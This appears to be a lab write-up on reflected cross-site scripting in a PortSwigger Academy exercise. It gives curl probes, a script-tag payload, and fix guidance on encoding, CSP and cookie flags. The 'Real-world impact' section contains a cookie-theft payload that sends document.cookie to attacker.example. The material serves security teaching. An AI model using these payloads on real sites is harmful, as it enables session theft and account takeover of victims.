---
title: "Reflected XSS into HTML context with nothing encoded"
date: 2026-08-22 09:00:00 -0500
categories: [PortSwigger, Cross-site-scripting]
tags: [portswigger, cwe-79, xss, reflected, html-context, javascript]
description: "The simplest cross-site scripting case: a search box echoes your input straight back into the page with no encoding, so a bare <script> tag executes. The full triage — confirm the reflection, read the context, fire the payload — plus how to escalate from a harmless alert() to a real session theft."
image:
    path: /assets/Images/PortSwigger-avatar.png
    alt: Reflected XSS into HTML context with nothing encoded
---

## Overview

This is the most fundamental [cross-site scripting](https://cwe.mitre.org/data/definitions/79.html) ([CWE-79](https://cwe.mitre.org/data/definitions/79.html)) case there is. The blog's search feature reflects whatever you type back into the results page, and it does so with **no output encoding at all** — so a search term of `<script>alert(1)</script>` comes back as a real script element and runs in the browser. One request solves it.

## The technique

Reflected XSS happens when user input travels in the request, is copied into the server's response, and reaches the victim's browser without being neutralized. The vulnerability is **context-dependent**: whether and how a payload fires depends on *where* in the HTML your input lands. Here the input lands directly in the page body (raw HTML context), and nothing is encoded, which is the easiest context to exploit — a bare tag just works.

The key insight is that HTML decides "tag vs. text" by looking at angle brackets. If the application had encoded the input, `<` would have been written as `&lt;` and the browser would have *displayed* the literal text `<script>` instead of running it. Because the raw `<` and `>` reached the browser untouched, the browser parsed `<script>...</script>` as a live element.

## Solution

**Step 1 — confirm the reflection and read the context.** Send a benign marker wrapped in test metacharacters and see how it comes back:

```bash
curl -sk -G "https://<lab-instance>.web-security-academy.net/" \
  --data-urlencode "search=zxcv<i>q</i>"
```

If the response contains the tags raw (`zxcv<i>q</i>`), the input is in HTML context with nothing encoded and a script payload will execute. If it comes back as `zxcv&lt;i&gt;q&lt;/i&gt;`, the angle brackets are encoded and you'd need a different context (attribute, JavaScript string) instead.

**Step 2 — fire the payload.** The marker came back raw, so inject the script directly:

```bash
curl -sk -G "https://<lab-instance>.web-security-academy.net/" \
  --data-urlencode "search=<script>alert(1)</script>"
```

The response body contains the payload verbatim:

```html
<h1>0 search results for '<script>alert(1)</script>'</h1>
```

Loading that URL in a browser — `/?search=<script>alert(1)</script>` — pops the alert, and the lab flips to **Solved**.

## Why it worked

The application built the HTML response by string-concatenating the user-supplied `search` value into the page with no context-aware escaping. Output encoding has to happen at the point where data crosses into a new context (here, into HTML), and it was simply absent. Any character with special meaning to the HTML parser — `<`, `>`, `"`, `'` — passed straight through, so the attacker controls markup, not just text.

## Real-world impact

`alert(1)` is only a proof of execution. Because the attacker runs arbitrary JavaScript in the victim's session and origin, the same hole allows stealing a session cookie when it lacks `HttpOnly`:

```html
<script>new Image().src='//attacker.example/'+document.cookie</script>
```

It also enables performing authenticated actions as the victim, keylogging the page, or chaining to full account takeover. Reflected XSS is delivered by getting the victim to open a crafted link — phishing, a malicious ad, or a planted forum post.

## Fix / defense

- **Context-aware output encoding** — HTML-encode `< > " ' &` whenever user input is reflected into the page. This is the primary control, and the encoding must match the output context (HTML body vs. attribute vs. JavaScript string).
- **Use a framework that auto-escapes by default** (React, Angular, Jinja2/Twig autoescape) and avoid dangerous sinks like `innerHTML` and `document.write`.
- **Content-Security-Policy** as defense-in-depth — block inline scripts so an injected `<script>` won't run even if it lands.
- **HttpOnly + SameSite cookies** to blunt the session-theft escalation.
